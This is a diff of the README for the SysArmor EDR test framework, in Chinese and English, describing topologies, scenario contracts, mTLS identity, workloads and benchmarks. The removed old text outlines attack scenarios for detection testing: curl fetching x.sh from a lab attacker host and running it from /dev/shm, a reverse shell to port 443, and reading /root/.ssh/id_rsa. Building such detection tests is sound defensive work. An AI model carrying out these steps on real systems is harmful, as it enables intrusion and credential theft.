@@ -1,305 +1,434 @@
-# SysArmor 测试环境
+# SysArmor Test Framework
 
-两种独立拓扑(容器 / VM),验证 EDR 采集能**跨 namespace 和终端类型**工作:
-同一套场景与事实契约,不管 endpoint 是容器还是 VM,都应产出结构一致的 Event/Signal/Incident。
+`test/` 是 SysArmor Next 的端到端测试、场景契约、采集效果评估和性能基准目录。它的目标不是只证明某条脚本能跑通,而是回答同一个 agent 在不同拓扑、策略档位和工作负载下:
 
-## 拓扑
+- 采到了哪些事件;
+- 产出了哪些 endpoint signal / cloud signal / incident;
+- 是否存在漏采、误报、drop 或 parse error;
+- agent 和 sensor 的 CPU/RSS/EPS 成本是多少;
+- 成本来自采集策略、业务负载、sensor runtime 还是后端处理链路。
 
-```
-容器拓扑 (docker compose)               VM 拓扑 (Vagrant + libvirt)
-┌──────────────────────────────┐        ┌──────────┐ ┌──────────┐
-│ 宿主机内核                    │        │ attacker │ │  node-a  │
-│  └─ Docker: sysarmor-net     │        │  VM(C2)  │ │ +agent   │
-│      ├─ attacker  .99        │        │  独立内核  │ │  独立内核 │
-│      ├─ node-a    .11        │        └──────────┘ └──────────┘
-│      ├─ mgr       .10        │
-│      └─ tetragon (eBPF 传感器)│        agent 自带/托管 Tetragon sensor
-│                               │
-│ tetragon 共享宿主内核          │        不需要 Docker
+设计原则见 `references/docs/testing-benchmark.md`:功能 E2E、workload、recorder、benchmark、diagnostic 分开维护,不要把性能采样、synthetic workload 或 perf/pprof 逻辑塞进功能断言脚本。
+
+## Topology
+
+同一套场景契约会在容器和 VM 两种拓扑下运行,用于验证事件采集和检测结果能跨 namespace、跨运行环境保持一致。
+
+```text
+Container topology (docker compose)       VM topology (Vagrant + libvirt)
+┌──────────────────────────────┐          ┌──────────┐ ┌──────────┐
+│ host kernel                   │          │ attacker │ │  node-a  │
+│  └─ Docker: sysarmor-net      │          │  VM(C2)  │ │ +agent   │
+│      ├─ attacker  .99         │          │          │ │ +sensor  │
+│      ├─ node-a    .11         │          └──────────┘ └──────────┘
+│      ├─ mgr       .10         │
+│      └─ tetragon sensor       │          agent-owned Tetragon path
 └──────────────────────────────┘
 ```
 
-## 场景设计
-
-每个场景是一份**契约**:给定攻击输入,系统必须(或不)产出指定的 Event/Signal/Incident。
-
-| 场景 | ATT&CK | 核心命题 | Incident |
-|---|---|---|---|
-| **apt-fileless-c2** | T1190→T1059→T1105→T1571 | "响"的攻击:端侧产 terminal,云端缝合 | =1 |
-| **apt-staged-drop** | T1105+T1574 | 云端图立论:跨 lineage,端侧无 terminal | =1 |
-| **benign-ci-noise** | 误报基准 | 罕见度≠裸加:良性 CI 不产 Incident | =0 |
-
-三场景构成最小完备集:正向(有攻击应检出)+ 横向(跨 lineage) + 负向(无攻击不误报)。
-
-### apt-fileless-c2 (Log4Shell 风格)
-
-```
-java-web → bash → curl 10.66.0.99:8080/x.sh → bash /dev/shm/x.sh
-                                                    ↓
-                                              反弹 shell → 10.66.0.99:443
-                                              后渗透: cat /root/.ssh/id_rsa
-```
-
-端侧单 lineage 内形成完整攻击链,产 terminal Signal。云端缝合成 Incident。
-契约要点:端侧必须产 terminal,Incident=1,证据子图包含 bash→x.sh→C2 路径。
-
-### apt-staged-drop (跨 lineage 分阶段)
-
-```
-lineage A (CI 构建): curl → 10.66.0.99:8080/helper → /var/lib/app/plugins/helper
-                     ──── 间隔 GAP 秒 ────
-lineage B (应用加载): /var/lib/app/plugins/helper --report 10.66.0.99:443
-```
-
-落盘与执行分属不同 lineage,端侧任一 lineage 都不产 terminal。
-只有云端 provenance graph 通过共享文件节点 `/var/lib/app/plugins/helper` 缝合,才能成案。
-契约要点:端侧无 terminal,Incident=1,lineage_ids≥2,证据子图含 helper 节点。control:关闭 cross_lineage 则 Incident=0。
-
-### benign-ci-noise (良性 CI 噪音)
-
-```
-CI 构建 ×N 轮: curl → 10.66.0.99:8080 (拉依赖) → 编译 → 写 artifact
-```
-
-行为模式与攻击高度相似(curl 外联+文件写入+执行),但完全合法。
-核心断言:Incident=0 (罕见度+结构收敛不误报)。
-control:切换为 additive_threshold 则误报(Incident≥1),证明裸加是反模式。
-
-## 目录结构
-
-```
-test/
-├── Makefile                 e2e 入口
-│
-├── env/                     搭建:拓扑定义 + 镜像 + 资源
-│   ├── container/
-│   │   ├── compose.yaml      容器拓扑声明
-│   │   └── images/           Dockerfile (attacker / node-a / mgr)
-│   ├── vm/
-│   │   ├── Vagrantfile       VM 拓扑声明
-│   │   └── provision/        setup-c2 / setup-credentials
-│   └── resources/            共享资源
-│       ├── syscall-capture.yaml   replay/debug/perf 兼容 TracingPolicy
-│       └── registry-token         假凭据
-│
-├── scenarios/               执行:攻击脚本 + 期望契约
-│   ├── container/            容器拓扑场景 (docker exec 触发)
-│   └── vm/                   VM 拓扑场景 (vagrant ssh 触发)
-│
-├── policies/                PolicyEnvelope 契约 (agent 配置,待接入)
-│
-├── harness/                 功能编排:start / stop / capture / assert / e2e report
-│
-├── tools/
-│   ├── recorder/             长跑低扰动性能时间线
-│   ├── diagnostics/          perf / pprof / strace 热点诊断
-│   └── benchmarks/           collection / lifecycle benchmark matrix
-│
-├── workloads/               目标目录:exec/file/net/mixed/business 性能 workload
-│
-└── .results/                抓包样本
-```
-
-一句话:
-- **env/** = 搭环境(搭完不动)
-- **scenarios/** = 跑什么(攻击输入+断言)
-- **policies/** = agent 契约(待接入)
-- **harness/** = 怎么跑功能 E2E(生命周期+采集+判对错)
-- **tools/recorder/** = 长期记录 CPU/RSS/EPS/drop/signal 时间线
-- **tools/benchmarks/** = 成本多少(policy/sensor/workload 矩阵)
-- **tools/diagnostics/** = 为什么慢(perf/pprof/strace)
-- **workloads/** = 施加什么性能压力(后续收敛入口)
-
-下一阶段测试 harness 会按 `references/docs/testing-benchmark.md` 收敛:
+当前 endpoint refinement 的主路径是 VM 内 agent 托管真实 Tetragon:
 
 ```text
-E2E 验功能
-Workload 造压力
-Recorder 记长期时间线
-Benchmark 做 sensor/policy/workload 矩阵
-Diagnostic 查热点
+sysarmor-agent run --config ...
+  -> agent-owned Tetragon + tetra getevents
+  -> normalize + endpoint detection engine
+  -> durable spool WAL
+  -> sysarmorctl --agent-sock /var/run/sysarmor/agent.sock
+  -> harness/assert-vm-local.sh
 ```
 
-原则:不要把性能 recorder、synthetic workload 或 perf/pprof 逻辑继续塞进功能 E2E 脚本。
+容器拓扑和部分平台兼容测试仍保留 manager/upload 路径:
 
-## 快速开始
+```text
+sysarmor-agent
+  -> durable spool + upload worker
+  -> sysarmor-manager AgentDataService Upload(DataBatch) / analytics / store
+  -> sysarmorctl JSON query
+  -> harness/assert.py
+```
+
+Data upload has a single transport: gRPC `AgentDataService.Upload(DataBatch)`. Test fixtures use `sysarmor-databatch-upload` to submit DataBatch payloads through the same data-plane service; HTTP remains only for manager query/control APIs.
+
+## Agent mTLS Identity
+
+Production agent-to-manager gRPC should run with mTLS enabled on the manager:
+
+```text
+--grpc-tls-cert manager.pem
+--grpc-tls-key manager-key.pem
+--grpc-client-ca ca.pem
+--grpc-require-client-cert
+```
+
+The agent certificate identity is bound to `tenant_id` and `agent_id`. The preferred certificate subject identity is a URI SAN:
+
+```text
+spiffe://sysarmor.local/tenant/<tenant_id>/agent/<agent_id>
+```
+
+The manager verifies that this certificate identity matches the `DataBatch.header.tenant_id/agent_id` and the `ControlStream.context.tenant_id/agent_id`. It also records the presented certificate principal in the agent registry; the same `tenant_id/agent_id` cannot later present a different mTLS principal. Common Name formats such as `<tenant_id>/<agent_id>` are accepted only as a compatibility fallback.
+
+`DataAck` semantics:
+
+| Status | Cursor effect | Retry |
+|---|---|---|
+| `STATUS_ACCEPTED` | `committed_cursor` is safe to remove from local spool | no |
+| `STATUS_DUPLICATE` | already committed; local spool can remove it | no |
+| `STATUS_RETRYABLE` | keep local spool entry | yes, optionally after `retry_after_ms` |
+| `STATUS_REJECTED` | terminal reject unless `retryable=true`; local worker may drop with health error | no |
+
+`ControlStream` frames use `contract_version=1`. Rejected frames carry both a `ControlAck(status="rejected")` and structured `ControlError{code,message,retryable,retry_after_ms}`.
+
+Local `sysarmorctl --agent-sock` is intentionally separate from cloud control. It is a local Unix socket operator/debug path and can watch/query the local spool/WAL as a read-only side channel. Production manager traffic remains `AgentDataService` for data flow and `ControlStream` for control flow.
+
+Development certificates can be generated with:
 
 ```bash
-# 容器拓扑: build → manager/agent replay → sysarmorctl assert
-make e2e TOPO=container SCENARIO=apt-fileless-c2
-make e2e TOPO=container SCENARIO=apt-staged-drop
-make e2e TOPO=container SCENARIO=benign-ci-noise
-
-# VM 拓扑: VM 内执行场景，由 agent-owned Tetragon sensor 采集，sysarmorctl 直连 agent.sock 验证
-make e2e TOPO=vm SCENARIO=apt-fileless-c2
-make e2e TOPO=vm SCENARIO=apt-staged-drop
-make e2e TOPO=vm SCENARIO=benign-ci-noise
-
-# VM systemd + agent-owned real Tetragon process smoke
-make e2e-agent-real-tetragon-owned-vm
-
-# container + agent-owned real Tetragon process smoke
-make e2e-agent-real-tetragon-owned-container
-
-# 生命周期 smoke
-make e2e TOPO=container SCENARIO=lifecycle-smoke
-make e2e TOPO=vm SCENARIO=lifecycle-smoke
-
-# graceful shutdown / spool flush smoke
-make e2e-agent-shutdown
-
-# startup capability/bundle failure -> degraded health
-make e2e-agent-capability
-
-# upload retry/backoff soak
-make e2e-agent-retry-backoff
-
-# parse error health / tamper smoke
-make e2e-agent-parse-health
-
-# queue backpressure/drop health smoke
-make e2e-agent-backpressure
-
-# policy/control-plane smoke
-make e2e-policy-endpoint-disable
-make e2e-policy-agent-refresh
-make e2e-policy-cloud-disable
-make e2e-policy-publish
-
-# response/enforce observe-only smoke
-make e2e-response-observe-only
-make e2e-response-policy-deny
-make e2e-response-scope-deny
-make e2e-response-audit
-make e2e-response-approval
-
-# graph/evidence smoke
-make e2e-graph-evidence
-make e2e-incident-lifecycle
-make e2e-incident-attach-evidence
-make e2e-incident-merge
-
-# store/Postgres foundation smoke
-make e2e-store-status
-make e2e-query-pagination
-make e2e-postgres-store
-make e2e-postgres-all
-
-# Agent Gateway stream foundation smoke
-make e2e-agent-gateway-session
-make e2e-agent-gateway-downlink
-make e2e-agent-gateway-frames
-make e2e-agent-gateway-grpc-stream
-make e2e-agent-gateway-stream-upload
-make e2e-agent-gateway-stream-resume
-make e2e-agent-gateway-policy-downlink
-make e2e-agent-gateway-response-command
-make e2e-agent-gateway-evidence-pullback
-make e2e-agent-gateway-stream-all
-
-# 性能基线 smoke
-make perf TOPO=container DUR=10
-make perf TOPO=vm DUR=10
-
-# 资源占用采样: 容器看宿主机上的 EDR 容器/进程占用,VM 看 node-a 内部进程占用
-make perf-resource TOPO=container SCENARIO=idle DUR=30
-make perf-resource TOPO=vm SCENARIO=idle DUR=30
-
-# VM 长跑 recorder: 可先启动 recorder,再运行任意 e2e/workload/手工操作,最后生成 summary
-make recorder-vm-start RUN_ID=my-run
-make recorder-vm-mark RUN_ID=my-run PHASE=workload_start DETAIL=mixed-edr-storm
-make recorder-vm-stop RUN_ID=my-run
-make recorder-vm-report RUN_ID=my-run
-
-# VM collection policy benchmark: 每个 policy 都会生成 timeline/markers/summary,最后汇总 matrix
-make bench-collection-vm DIAG_SCENARIO=mixed-edr-storm
-make bench-collection-vm DIAG_SCENARIO=benign-business
-make bench-edr-lifecycle-vm DIAG_SCENARIO=mixed-edr-storm
-make bench-e2e-vm TOPO=vm SCENARIO=apt-fileless-c2
-
-# VM Tetragon 热点诊断: 只用于定位 CPU 去向,不作为正式资源结论
-make diag-tetragon-vm
-make diag-tetragon-vm-workload DIAG_SCENARIO=mixed-edr-storm
-
-# 汇总
-make report
-
-# 清理
-make clean                           # down + 删 .results/
+tools/pki/gen-mtls-dev.sh test/.results/pki default agent-a localhost
 ```
 
-## 当前产品链路
-
-当前 endpoint refinement 阶段的 VM 主运行路径是:
-
-```
-sysarmor-agent run --config ...（agent-owned Tetragon + tetra getevents）
-  → normalize + endpoint detection engine
-  → local event/signal stream buffer
-  → sysarmorctl --agent-sock /var/run/sysarmor/agent.sock
-  → harness/assert-vm-local.sh
-```
-
-container 和平台兼容测试仍保留旧 manager 路径:
-
-```
-sysarmor-agent run --config ...（agent-managed tetra getevents）
-  → normalize + detection engine
-  → durable spool + upload worker
-  → sysarmor-manager AgentGateway upload/analytics/store
-  → sysarmorctl JSON query
-  → harness/assert.py
-```
-
-agent 默认用 HTTP upload 兼容 e2e;也支持 gRPC AgentGateway:
+The mTLS smoke test covers successful upload, forged `agent_id` rejection, and missing client certificate rejection:
 
 ```bash
-docker exec mgr /opt/sysarmor/bin/sysarmor-agent \
-  --transport grpc --manager 127.0.0.1:9444 \
-  --scenario grpc-smoke --input-jsonl /tmp/lifecycle.sensor.jsonl
+make -C test e2e-agent-mtls
 ```
 
-`capture-vm` 当前只走本地 agent 主路径,不启动 manager/Kafka/Postgres。`capture-container` 仍保留平台/manager 路径,后续会继续向本地 agent-first 测试收敛。
-agent 仍支持直接读取 Tetragon raw JSONL,用于 raw adapter smoke。
+## Directory Map
 
-## 常用调试
+```text
+test/
+├── Makefile                  test entrypoints
+├── README.md                 this document
+├── SCENARIOS.md              scenario input/output contracts
+│
+├── env/                      topology and shared environment input
+│   ├── container/
+│   │   ├── compose.yaml
+│   │   └── images/
+│   ├── vm/
+│   │   ├── Vagrantfile
+│   │   └── provision/
+│   └── resources/
+│       ├── syscall-capture.yaml
+│       └── registry-token
+│
+├── scenarios/                functional/security scenarios
+│   ├── container/<scenario>/
+│   │   ├── attack.sh
+│   │   └── expected.yaml
+│   └── vm/<scenario>/
+│       ├── attack.sh
+│       └── expected.yaml
+│
+├── workloads/                repeatable pressure sources, no security assertions
+│   └── vm/<workload>/run.sh
+│
+├── policies/                 collection/detection/resource/telemetry/response samples
+├── content/                  IOC/context/rulepack content used by policies
+│
+├── harness/                  functional orchestration and assertions
+│   ├── start-*.sh
+│   ├── stop-*.sh
+│   ├── capture-*.sh
+│   ├── assert.py
+│   ├── assert-vm-local.sh
+│   └── e2e-*.sh
+│
+├── tools/
+│   ├── recorder/             long-running timeline sampler
+│   ├── benchmarks/           policy/workload matrix runners and reports
+│   └── diagnostics/          perf/pprof/strace helpers
+│
+└── .results/                 generated outputs
+```
+
+记忆方式:
+
+| 目录 | 角色 | 说明 |
+|---|---|---|
+| `env/` | 环境输入 | Docker/Vagrant 拓扑、镜像、provision、共享资源 |
+| `scenarios/` | 功能输入 | 攻击/良性场景脚本 + `expected.yaml` 契约 |
+| `workloads/` | 压力输入 | exec/file/network/mixed/business 负载,不做安全断言 |
+| `policies/` | 策略输入 | 采集、检测、资源、上行、响应策略样例 |
+| `content/` | 内容输入 | IOC feed、路径上下文、endpoint rulepack |
+| `harness/` | 测试代码 | 启停、采集、断言、专项 e2e |
+| `tools/recorder/` | 性能采样 | CPU/RSS/EPS/drop/signal timeline |
+| `tools/benchmarks/` | 矩阵评估 | policy x workload x phase 汇总 |
+| `tools/diagnostics/` | 热点诊断 | perf/pprof/strace,用于解释成本 |
+| `.results/` | 输出 | event/signal ndjson、summary、matrix、日志 |
+
+## Scenario Contracts
+
+每个 scenario 是一份功能契约:给定输入动作,系统必须或不得产出指定的 Event、Signal、Incident、Evidence 或 Response。
+
+| 场景 | 核心命题 | 期望 |
+|---|---|---|
+| `apt-fileless-c2` | 单 lineage 内形成完整攻击链 | endpoint terminal signal, incident=1 |
+| `apt-staged-drop` | 跨 lineage 分阶段落盘和执行 | endpoint 不应单独 terminal, cloud incident=1 |
+| `benign-ci-noise` | 良性 CI 行为与攻击相似但不应成案 | incident=0 |
+| `lifecycle-smoke` | agent 生命周期和基础事件可见性 | agent registered, events visible |
+
+详见 `SCENARIOS.md`。
+
+## Workloads
+
+`workloads/` 是性能压力输入,不负责安全断言。每个 `run.sh` 接受类似参数:
 
 ```bash
-# 查询 manager 健康
-docker exec mgr /opt/sysarmor/bin/sysarmorctl --mgr 127.0.0.1:9443 status --json
-
-# 查询信号和事件
-docker exec mgr /opt/sysarmor/bin/sysarmorctl --mgr 127.0.0.1:9443 signals --scenario apt-fileless-c2 --layer endpoint --json
-docker exec mgr /opt/sysarmor/bin/sysarmorctl --mgr 127.0.0.1:9443 events --scenario lifecycle-smoke --behavior process.exec --json
-
-# control assertion: 反事实重算,不污染 store
-docker exec mgr /opt/sysarmor/bin/sysarmorctl --mgr 127.0.0.1:9443 recompute --scenario apt-staged-drop --disable cloud.cross_lineage --json
-docker exec mgr /opt/sysarmor/bin/sysarmorctl --mgr 127.0.0.1:9443 recompute --scenario benign-ci-noise --mode additive_threshold --json
-
-# raw Tetragon adapter smoke
-docker cp .results/apt-fileless-c2.vm.tetragon.jsonl tetragon:/tmp/raw.jsonl
-docker exec tetragon /opt/sysarmor/bin/sysarmor-agent --manager http://10.66.0.10:9443 --scenario raw-fileless --stream-jsonl /tmp/raw.jsonl
+DURATION=60 REPEAT=10 CONCURRENCY=1 ./run.sh
 ```
 
-## 前提
+当前 VM workload:
 
-| 拓扑 | 需要 |
+| Workload | 用途 |
 |---|---|
-| 容器 | Docker Compose v2 |
-| VM | libvirt + vagrant-libvirt |
+| `exec-storm` | 放大 process exec/fork/exit 路径 |
+| `file-read-storm` | 放大 credential/secret read 路径 |
+| `file-write-storm` | 放大 payload/persistence write/chmod 路径 |
+| `network-connect-storm` | 放大 socket connect 路径 |
+| `mixed-edr-storm` | 混合 exec/file/network,默认 sensor benchmark |
+| `benign-business` | 正常构建/校验/文件活动,评估业务干扰和误报 |
 
-## 注意事项
+## Policy And Content Inputs
 
-- 容器镜像源:`docker.1panel.live`(实测可用);`docker.1ms.run` 坏的。
-- 容器内 apt 源需 sed 为 `mirrors.edge.kernel.org` + 关 https 校验。
-- VM tetragon 从 GitHub release 下载 tarball;VM 内 GitHub 被墙时需手动下载。
-- VM provision 默认不再预加载 `syscall-capture.yaml`;如需兼容 replay/debug/perf，可在 provision 时显式设置 `SYSARMOR_PRELOAD_VM_POLICY=1`。
-- 容器拓扑 tetragon `--pid=host`,当前靠 TracingPolicy selector 过滤噪音;后续可加 `--cgroup-filter`。
-- VM 拓扑修改脚本后需 `make provision`(rsync + re-provision)。
-- VM topology 在 `mgr` VM 内运行 `sysarmor-manager` 和 `sysarmorctl`,在 `node-a` VM 内运行 agent stream。
-- `perf-getevents` 是短窗口采集吞吐 baseline smoke,EPS 可能为 0。
-- `recorder-vm-*` 是当前 VM 性能评估主线。它先启动低扰动采样,中间用 marker 记录 policy apply、steady、workload 等阶段,最后生成 `timeline.csv`、`markers.ndjson`、`events.ndjson`、`signals.ndjson`、`summary.json`。CPU 采样使用 VM 内 `/proc/<pid>/stat` jiffies delta,比短窗口 `ps %CPU` 更适合长跑比较。event/signal 计数使用启动时 stream sequence cursor + labels 过滤,并优先按 frame `observedAt` 与 marker 窗口做严格 delta。
-- `bench-collection-vm` 和 `bench-edr-lifecycle-vm` 都基于 recorder,用于比较不同 collection policy 或生命周期阶段的 CPU/RSS/EPS/drop/signal。默认 collection policy 矩阵是 `minimal-high-signal / edr-balanced / incident-deep / debug-wide`。
-- `bench-e2e-vm` 用 recorder 包住 VM 功能 E2E,用于把攻击场景结果和运行期间性能曲线放到同一份 run 里。
-- `diag-tetragon-vm*` 只做 perf/pprof/strace 热点诊断。它可以复用 `workloads/vm/*`,但不输出正式资源结论。
-- `perf-resource` 是 legacy 短窗口采样入口,输出 `.results/perf-resource.<topo>.<scenario>.csv`;后续会被 recorder/container recorder 替代。
+`policies/` 中最常用于采集评估的是 collection policy 档位:
+
+| Policy | 用途 |
+|---|---|
+| `collection-minimal-high-signal.json` | 最小常开面,低成本高置信 |
+| `collection-edr-balanced.json` | 长期运行 EDR baseline |
+| `collection-incident-deep.json` | 调查窗口/高风险窗口增强采集 |
+| `collection-debug-wide.json` | 调试和能力边界探索,高可见性高成本 |
+
+辅助策略:
+
+| 文件 | 用途 |
+|---|---|
+| `detection.yaml` | 默认检测与收敛参数 |
+| `detection-additive.yaml` | benign 对照实验,证明裸加阈值容易误报 |
+| `resource.yaml` | 端侧资源预算样例 |
+| `telemetry.yaml` | 上行批处理/重试策略样例 |
+| `response.yaml` | 响应策略样例 |
+
+`content/` 提供这些 policy 引用的 IOC 和上下文:
+
+```text
+context-credential-path-prefixes.json
+context-payload-path-prefixes.json
+context-persistence-path-prefixes.json
+context-secret-volume-prefixes.json
+ioc-c2-ip-feed.json
+ioc-c2-port-feed.json
+rulepack-cep-endpoint.json
+```
+
+## Outputs
+
+所有生成物默认写入 `test/.results/`。
+
+功能 E2E 常见输出:
+
+```text
+test/.results/
+├── <topology>.<scenario>.json
+├── <topology>.<scenario>.events.ndjson
+├── <topology>.<scenario>.signals.ndjson
+├── <topology>.<scenario>.local.json
+└── <topology>.<scenario>.linked.json
+```
+
+Recorder 输出:
+
+```text
+test/.results/recordings/<run-id>/
+├── timeline.csv       sampled CPU/RSS/EPS/drop/health counters
+├── markers.ndjson     phase markers
+├── events.ndjson      scoped event frames
+├── signals.ndjson     scoped signal frames
+├── recorder.log
+└── summary.json       phase summary
+```
+
+Collection benchmark 输出:
+
+```text
+test/.results/bench-collection-vm/<run-id>/
+├── matrix.csv
+├── matrix.json
+├── content.<name>.apply.json
+└── <policy-name>/
+    ├── timeline.csv
+    ├── markers.ndjson
+    ├── events.ndjson
+    ├── signals.ndjson
+    ├── summary.json
+    ├── collection-apply.json
+    ├── workload.out
+    └── workload.err
+```
+
+Lifecycle benchmark 输出:
+
+```text
+test/.results/bench-edr-lifecycle-vm/<run-id>/
+├── timeline.csv
+├── markers.ndjson
+├── summary.json
+├── collection-apply.json
+├── workload.out
+└── workload.err
+```
+
+`timeline.csv` 记录 agent CPU/RSS、sensor CPU/RSS、EDR 总 CPU/RSS、events、signals、drops、parse errors、active policy 等字段。`summary.json` 会按 marker 切出 baseline、policy_apply、settle、steady、workload 等阶段。
+
+## Common Commands
+
+从仓库根目录运行:
+
+```bash
+# 功能 E2E: container topology
+make -C test e2e TOPO=container SCENARIO=apt-fileless-c2
+make -C test e2e TOPO=container SCENARIO=apt-staged-drop
+make -C test e2e TOPO=container SCENARIO=benign-ci-noise
+
+# 功能 E2E: VM topology, agent-owned sensor/local ctl path
+make -C test e2e TOPO=vm SCENARIO=apt-fileless-c2
+make -C test e2e TOPO=vm SCENARIO=apt-staged-drop
+make -C test e2e TOPO=vm SCENARIO=benign-ci-noise
+
+# Real Tetragon ownership smoke
+make -C test e2e-agent-real-tetragon-owned-vm
+make -C test e2e-agent-real-tetragon-owned-container
+
+# Agent reliability and runtime smoke
+make -C test e2e-agent-shutdown
+make -C test e2e-agent-backpressure
+make -C test e2e-agent-runtime-all
+
+# Policy / response / graph / store gates
+make -C test e2e-policy-all
+make -C test e2e-response-all
+make -C test e2e-graph-all
+make -C test e2e-postgres-all
+
+# Short performance smoke
+make -C test perf TOPO=vm DUR=10
+make -C test perf-resource TOPO=vm SCENARIO=idle DUR=30
+
+# VM recorder: wrap any manual workload or E2E
+make -C test recorder-vm-start RUN_ID=my-run
+make -C test recorder-vm-mark RUN_ID=my-run PHASE=workload_start DETAIL=mixed-edr-storm
+make -C test recorder-vm-stop RUN_ID=my-run
+make -C test recorder-vm-report RUN_ID=my-run
+
+# VM collection policy benchmark
+make -C test bench-collection-vm DIAG_SCENARIO=benign-business
+make -C test bench-collection-vm DIAG_SCENARIO=mixed-edr-storm
+make -C test bench-collection-vm DIAG_SCENARIO=apt-fileless-c2
+
+# Fixed policy x workload/scenario benchmark matrix, then effectiveness report
+make -C test bench-matrix-vm
+
+# Build an effectiveness report from existing scenario/benchmark outputs
+make -C test effectiveness-report TOPO=vm RUN_ID=manual
+
+# EDR lifecycle benchmark
+make -C test bench-edr-lifecycle-vm DIAG_SCENARIO=mixed-edr-storm
+
+# Run a functional E2E with recorder around it
+make -C test bench-e2e-vm SCENARIO=apt-fileless-c2
+
+# Tetragon hotspot diagnostic, not an official resource conclusion
+make -C test diag-tetragon-vm
+make -C test diag-tetragon-vm-workload DIAG_SCENARIO=mixed-edr-storm
+
+# Aggregate simple reports and clean generated outputs
+make -C test report
+make -C test clean
+```
+
+## Evaluation Model
+
+当前框架已经能稳定回答效率问题:
+
+| 指标 | 来源 |
+|---|---|
+| agent/sensor/EDR CPU | recorder `timeline.csv` / `summary.json` |
+| agent/sensor/EDR RSS | recorder `timeline.csv` / `summary.json` |
+| EPS | recorder scoped event frames or event counters |
+| signal count | recorder scoped signal frames |
+| drops / parse errors | agent health sampled by recorder |
+| policy apply spike | `policy_apply` phase |
+| steady-state cost | `steady` phase |
+| workload cost | `workload` phase |
+
+效果评估当前主要由 scenario `expected.yaml` 和专项 e2e 断言完成。后续建议把效果指标也矩阵化:
+
+```text
+required_event_hit_rate
+event_recall_by_kind
+signal_hit_rate
+terminal_signal_latency_ms
+incident_hit_rate
+incident_latency_ms
+false_positive_count
+drop_rate
+parse_error_rate
+cost_per_1k_events_cpu
+```
+
+当前可用入口:
+
+```bash
+make -C test bench-matrix-vm
+make -C test effectiveness-report TOPO=vm RUN_ID=manual
+```
+
+`bench-matrix-vm` 固定跑:
+
+```text
+policies:
+collection-minimal-high-signal
+collection-edr-balanced
+collection-incident-deep
+collection-debug-wide
+
+workloads:
+benign-business
+exec-storm
+file-read-storm
+file-write-storm
+network-connect-storm
+mixed-edr-storm
+
+scenarios:
+apt-fileless-c2
+apt-staged-drop
+benign-ci-noise
+```
+
+它会输出:
+
+```text
+test/.results/bench-matrix-vm/<run-id>/matrix.csv
+test/.results/bench-matrix-vm/<run-id>/matrix.json
+test/.results/effectiveness/<run-id>/summary.json
+test/.results/effectiveness/<run-id>/matrix.csv
+test/.results/effectiveness/<run-id>/policy_comparison.csv
+test/.results/effectiveness/<run-id>/policy_comparison.json
+```
+
+这样可以把 policy 档位、业务工作负载和攻击场景放到同一张 matrix 中比较:采得准不准、全不全、快不快、贵不贵。
+
+`policy_comparison.csv` 的综合分模型:
+
+```text
+overall_score = 0.6 * effectiveness_score
+              + 0.3 * resource_score
+              + 0.1 * stability_score
+
+resource_score = 0.75 * inverse_cpu_score
+               + 0.25 * inverse_rss_score
+```
+
+其中 `effectiveness_score` 来自 `expected.yaml` 的结构化命中结果,`resource_score` 来自 workload 阶段的 EDR CPU/RSS,`stability_score` 在 drop 和 parse error 都为 0 时为 1。
